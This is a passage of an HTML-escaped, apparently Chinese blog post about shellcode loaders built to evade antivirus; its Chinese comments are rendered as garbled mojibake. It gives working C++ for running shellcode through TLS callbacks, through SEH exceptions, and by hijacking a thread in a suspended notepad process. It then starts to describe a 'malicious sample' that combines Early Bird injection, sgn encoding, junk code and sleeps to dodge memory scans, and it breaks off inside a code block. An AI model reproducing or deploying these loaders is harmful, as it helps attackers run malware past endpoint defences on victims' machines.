class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment(linker, &lt;span class=&#34;string&#34;&gt;&amp;quot;/section:.data,RWE&amp;quot;&lt;/span&gt;) &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;&amp;#125;  &lt;span class=&#34;comment&#34;&gt;//shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VOID NTAPI &lt;span class=&#34;built_in&#34;&gt;TlsCallBack&lt;/span&gt;(PVOID DllHandle, DWORD dwReason, PVOID Reserved)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//DllHandleæ¨¡å—å¥æŸ„ã€Reasonè°ƒç”¨åŸå› ã€ ReservedåŠ è½½æ–¹å¼ï¼ˆæ˜¾å¼/éšå¼ï¼‰&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (dwReason == DLL_PROCESS_ATTACH)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//å†™æ‰§è¡Œå‡½æ•°ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å…¶ä»–æ‰‹æ®µè¿›è¡Œshellcodeæ³¨å…¥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ((&lt;span class=&#34;built_in&#34;&gt;void&lt;/span&gt;(WINAPI*)(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)) &amp;amp; shellcode)();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//ä½¿ç”¨TLSéœ€è¦åœ¨ç¨‹åºä¸­æ–°å»ºä¸€ä¸ª.tlsæ®µä¸“é—¨å­˜æ”¾TLSæ•°æ®ï¼Œç”³æ˜ä½¿ç”¨&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment (linker, &lt;span class=&#34;string&#34;&gt;&amp;quot;/INCLUDE:__tls_used&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment (linker, &lt;span class=&#34;string&#34;&gt;&amp;quot;/INCLUDE:__tls_callback&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; data_seg (&lt;span class=&#34;string&#34;&gt;&amp;quot;.CRT$XLB&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//.CRTè¡¨æ˜æ˜¯ä½¿ç”¨C RunTimeæœºåˆ¶ï¼Œ$åé¢çš„XLBä¸­ï¼šXè¡¨ç¤ºéšæœºçš„æ ‡è¯†&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Lè¡¨ç¤ºæ˜¯TLS callback sectionï¼ŒBå¯ä»¥è¢«æ¢æˆBåˆ°Yä¹‹é—´çš„ä»»æ„ä¸€ä¸ªå­—æ¯ï¼Œ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//ä½†æ˜¯ä¸èƒ½ä½¿ç”¨â€œ.CRT$XLAâ€å’Œâ€œ.CRT$XLZâ€ï¼Œå› ä¸ºâ€œ.CRT$XLAâ€å’Œâ€œ.CRT$XLZâ€æ˜¯ç”¨äºtlssup.objçš„ã€‚&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; data_seg ()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 åªæ˜¯ä¸€ç§æ‰§è¡Œæ‰‹æ®µï¼Œä¾ç„¶å¯ä»¥é…åˆå…¶ä»–æ‰‹æ®µç»„åˆã€‚&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;SEH Code Execute (SEH å¼‚å¸¸å¤„ç†ä»£ç æ‰§è¡Œ)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 SEH (Structured Exception Handling) ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼Œæ˜¯ windows æ“ä½œç³»ç»Ÿé»˜è®¤çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œé€šè¿‡ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸ç„¶åå°†æ¶æ„ä»£ç æ’å…¥å³å¯è§¦å‘ï¼Œå¯ç”¨äºåè°ƒè¯•ã€‚&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment(linker, &lt;span class=&#34;string&#34;&gt;&amp;quot;/section:.data,RWE&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ExceptFilter&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ((&lt;span class=&#34;built_in&#34;&gt;void&lt;/span&gt;(*NTAPI)(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)) &amp;amp; shellcode)();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; EXCEPTION_CONTINUE_EXECUTION;&lt;span class=&#34;comment&#34;&gt;//è¿”å›å‡ºé”™ä½ç½®é‡æ–°æ‰§è¡Œ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _try&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; c = a / b;  &lt;span class=&#34;comment&#34;&gt;//åªè¦èƒ½è§¦å‘å¼‚å¸¸å³å¯&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _except(&lt;span class=&#34;built_in&#34;&gt;ExceptFilter&lt;/span&gt;()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 éœ€è¦ä¸»åŠ¨è§¦å‘å¼‚å¸¸ï¼Œå½“ç„¶å¯ä»¥å¡«å……å¤§é‡ä»£ç å°†è§¦å‘å¼‚å¸¸çš„ä»£ç å†™çš„å¾ˆéšè”½ï¼Œè¿˜å¯ä»¥åšåˆ°åè°ƒè¯•çš„æ•ˆæœï¼Œä¹Ÿéœ€è¦é…åˆå…¶ä»–æ‰‹æ®µé£Ÿç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;SetContext Hijack Thread (çº¿ç¨‹ä¸Šä¸‹æ–‡ç¯å¢ƒåŠ«æŒ)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 ç®€å•ç†è§£å°±æ˜¯åŠ«æŒçº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œç„¶åå¼ºè¡Œå°† eip/rip æŒ‡å‘ shellcode å¹¶æ‰§è¡Œã€‚&lt;br /&gt;
åŠ«æŒæµç¨‹ï¼š&lt;br /&gt;
1ã€åˆ›å»ºä¸€ä¸ªæŒ‚èµ·çš„åˆæ³•è¿›ç¨‹&lt;br /&gt;
 2ã€å°†æ¶æ„ shellcode å†™å…¥è¯¥è¿›ç¨‹&lt;br /&gt;
 3ã€å°† eip/rip æŒ‡å‘è¯¥åœ°å€&lt;br /&gt;
 4ã€æ¢å¤çº¿ç¨‹&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    STARTUPINFOA si = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    si.cb = &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(si);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PROCESS_INFORMATION pi = &amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;CreateProcessA&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, (LPSTR)&lt;span class=&#34;string&#34;&gt;&amp;quot;notepad&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, FALSE, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;si, &amp;amp;pi);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;SuspendThread&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     LPVOID lpBuffer = &lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(pi.hProcess, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(pi.hProcess, lpBuffer, shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     CONTEXT ctx = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     ctx.ContextFlags = CONTEXT_ALL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;GetThreadContext&lt;/span&gt;(pi.hThread, &amp;amp;ctx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     ctx.Rip = (DWORD64)lpBuffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;SetThreadContext&lt;/span&gt;(pi.hThread, &amp;amp;ctx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;ResumeThread&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;æœ¬åœ°æµ‹è¯•æ•ˆæœå’Œå…¶ä»–æ‰‹æ³•æ¼”ç¤º&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æœ¬åœ°æµ‹è¯•æ•ˆæœå’Œå…¶ä»–æ‰‹æ³•æ¼”ç¤º&#34;&gt;#&lt;/a&gt; æœ¬åœ°æµ‹è¯•æ•ˆæœå’Œå…¶ä»–æ‰‹æ³•æ¼”ç¤º&lt;/h4&gt;
&lt;p&gt;æœ¬æ¬¡ç¼–å†™çš„æ¶æ„æ ·æœ¬æ‰‹æ³•ç»„åˆä¸ºï¼šsgn + Early Bird + RW/RX/NOA è½¬æ¢ + è‡ªå†™ Win32API + junkCode å¡«å…… + Sleep (15000)(å¾ªç¯çœŸç¡çœ ) è§„é¿ä¸»åŠ¨å†…å­˜æ‰«æ&lt;br /&gt;
ä¸»è¦ä»£ç ï¼š&lt;br /&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span 